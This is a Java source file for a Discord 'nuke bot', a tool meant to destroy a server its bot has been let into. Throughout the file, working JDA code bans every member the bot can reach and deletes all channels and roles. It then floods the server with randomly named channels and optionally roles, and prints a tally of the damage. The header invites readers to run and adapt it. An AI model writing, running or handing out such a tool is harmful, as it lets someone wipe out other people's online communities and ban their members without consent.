package org.hcrival.nukebot;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.channel.middleman.GuildChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 This is a discord nuke bot.
 The bot will ban all members, delete all channels, and delete all roles.
 The bot can also spam channels and roles.

Requirements:
 Make sure the bot has permissions in the discord.
 Make sure the bot has all intents enabled in the discord developer portal.
 Make sure the bot is in the discord server.

 Feel free to edit the code to your liking.
 If you have any questions feel free to contact me on discord: 6379

 Credit: <a href="https://github.com/aplosh">...</a>
 Credit: <a href="https://github.com/hcrivalorg>...</a>
 */
public class NukeBot {

    // a list of user ids that are exempt from being banned by the bot.
    private final List<String> exemptList = List.of(
            "345342568025817098" // example
    );

    // The token of the bot.
    private final String botToken = "0";

    // The id of the guild to be nuked.
    // Make sure to enable discord developer mode
    // https://www.howtogeek.com/714348/how-to-enable-or-disable-developer-mode-on-discord/
    private final long guildId = 0L;

    // The name of the channel to be created for spamming (if enabled).
    private final String spamChannelName = "nuked";

    // Whether or not to spam channels.
    private final boolean spamChannels = true;

    // Makes the channels have random names. (if enabled)
    private final boolean randomChannelNames = true;

    // The amount of channels to be created (if enabled).
    private final int spamChannelAmount = 100; // wouldn't do more then 500 due to probably being rate limited

    // The name of the role to be created for spamming (if enabled).
    private final String spamRoleName = "nuked";

    // Makes the roles name random (if enabled).
    private final boolean randomRoleNames = false;

    // Whether or not to spam roles.
    private final boolean spamRoles = false;

    // The amount of roles to be created (if enabled).
    private final int spamRoleAmount = 500; // cannot do more then 250 due to discord api limits

    public NukeBot() throws InterruptedException {

        // Creates the bot.
        JDA jda = JDABuilder.create(
                        botToken,
                        GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS))
                .setMemberCachePolicy(MemberCachePolicy.ALL)
                .setChunkingFilter(ChunkingFilter.ALL)
                .build().awaitReady();

        System.out.println(" ");
        System.out.println("Starting the nuking process");
        System.out.println("Starting the nuking process");
        System.out.println("Starting the nuking process");
        System.out.println(" ");

        // Gets the guild by the id provided.
        Guild guild = jda.getGuildById(guildId);

        // Checks if the guild is null.
        if (guild == null) {
            System.out.println("Guild not found, make sure the bot is in the discord server!");
            return;
        }

        // Nukes the guild.
        nuke(guild);
    }

    public static void main(String[] args) throws InterruptedException {
        // Creates a new instance of the bot.
        new NukeBot();
    }

    public void nuke(Guild guild) {
        // Failed bans, channels, and roles attempts.
        int failedBans = 0;
        int failedChannels = 0;
        int failedRoles = 0;

        // Stores the amount of members banned.
        int banned = 0;

        // Discord Bot Member.
        Member selfMember = guild.getSelfMember();

        // Loops through all the members in the guild.
        for (Member member : guild.getMembers()) {

            // Checks if the member is the bot.
            if (member == selfMember) {
                System.out.println("Cannot ban yourself");
                failedBans++;
                continue;
            }

            // Checks if the bot can interact with the member.
            if (!selfMember.canInteract(member)) {
                System.out.println("Cannot interact with " + member.getEffectiveName());
                failedBans++;
                continue;
            }

            // Checks if the member is in the exempt list.
            if (exemptList.contains(member.getId())) {
                System.out.println("Exempted " + member.getEffectiveName());
                failedBans++;
                continue;
            }

            // Bans the member.
            member.ban(1, TimeUnit.HOURS).queue();
            banned++;
            System.out.println("Banned " + member.getEffectiveName() + " (" + banned + ")");
        }

        System.out.println(" ");
        System.out.println("Banned " + banned + " members");
        System.out.println("Deleting all channels");

        // Stores the amount of channels deleted.
        int channels = 0;

        // Loops through all the channels in the guild.
        for (GuildChannel channel : guild.getChannels()) {
            try {
                // Deleting the channel.
                channel.delete().queue();
                channels++;
            } catch (Exception e) {
                // Failed to delete the channel.
                System.out.println("Failed to delete " + channel.getName() + " - " + e.getMessage());
                failedChannels++;
            }
        }

        System.out.println(" ");
        System.out.println("Deleted " + channels + " channels");
        System.out.println("Deleting all roles");

        // Stores the amount of roles deleted.
        int amount = 0;

        // Gets the bots highest role.
        Role selfRole = selfMember.getRoles().get(0);

        // Loops through all the roles in the guild.
        for (Role role : guild.getRoles()) {

            // Checks if the bot can interact with the role.
            if (!selfRole.canInteract(role)) {
                System.out.println("Cannot interact with " + role.getName());
                failedRoles++;
                continue;
            }

            // Checks if the role is the public role or boost role.
            if (role == guild.getPublicRole() || role == guild.getBoostRole()) {
                System.out.println("Cannot delete the public role or boost role");
                failedRoles++;
                continue;
            }

            // Deletes the role.
            try {
                role.delete().queue();
                amount++;
            } catch (Exception e) {
                // Failed to delete the role.
                System.out.println("Failed to delete " + role.getName() + " - " + e.getMessage());
                failedRoles++;
            }
        }

        System.out.println(" ");
        System.out.println("Deleted " + amount + " roles");
        System.out.println("Deleted everything");
        System.out.println(" ");

        // Checks if the bot should spam channels.
        if (spamChannels) {
            // Loops through the amount of channels to be created.
            for (int i = 0; i < spamChannelAmount; i++) {
                // Creates the channel.
                guild.createTextChannel((randomChannelNames) ? RandomStringUtils.random(10, true, true) : spamChannelName).queue();
            }
        }

        // Checks if the bot should spam roles.
        if (spamRoles) {

            // Checks if the amount of roles to be created is more then 250.
            if (spamRoleAmount >= 250) {
                System.out.println("Cannot create more than 250 roles");
                return;
            }

            // Loops through the amount of roles to be created.
            for (int i = 0; i < spamRoleAmount; i++) {
                // Creates the role.
                guild.createRole().setName((randomRoleNames) ? RandomStringUtils.random(10, true, true) : spamRoleName).queue();
            }
        }

        // Prints out the statistics.
        System.out.println("Guild Statistics: ");
        System.out.println(" Guild Owner: " + guild.getOwner().getEffectiveName());
        System.out.println(" Guild ID: " + guild.getId());
        System.out.println(" Guild Members: " + guild.getMembers().size());
        System.out.println(" ");
        System.out.println(" Banned Members: " + banned);
        System.out.println(" Deleted Channels: " + channels);
        System.out.println(" Deleted Roles: " + amount);
        System.out.println(" ");
        System.out.println(" Failed Bans: " + failedBans);
        System.out.println(" Failed Channels: " + failedChannels);
        System.out.println(" Failed Roles: " + failedRoles);
        System.out.println(" ");
        System.out.println(" Spammed Roles: " + spamRoles);
        System.out.println(" Spammed Channels: " + spamChannels);
        System.out.println(" ");
        System.out.println(" Finished nuking");
        System.out.println(" ");

        // Credits :)
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
    }
}